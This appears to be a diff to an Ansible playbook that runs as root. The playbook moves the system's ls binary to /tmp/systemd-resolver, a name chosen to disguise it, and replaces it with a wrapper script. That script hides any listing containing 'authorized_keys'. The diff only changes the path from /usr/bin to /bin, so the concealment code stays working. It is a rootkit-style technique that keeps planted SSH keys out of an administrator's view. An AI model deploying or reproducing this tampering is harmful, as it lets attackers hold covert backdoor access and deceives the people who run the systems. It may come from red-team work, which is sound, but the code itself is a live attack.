@@ -4,10 +4,10 @@
   become: yes
   tasks:
     - name: "move ls"
-      shell: "mv /usr/bin/ls /tmp/systemd-resolver"
+      shell: "mv /bin/ls /tmp/systemd-resolver"
     - name: "make new ls file"
-      shell: "touch /usr/bin/ls; chmod +x /usr/bin/ls"
+      shell: "touch /bin/ls; chmod +x /bin/ls"
     - name: "populate new ls file line 1"
-      shell: "echo '#!/bin/sh' >> /usr/bin/ls"
+      shell: "echo '#!/bin/sh' >> /bin/ls"
     - name: "populate new ls file line 2"
       shell: "echo 'if /tmp/systemd-resolver $@ | grep -q 'authorized_keys'; then exit 1; else /tmp/systemd-resolver $@; fi;' >> /bin/ls"
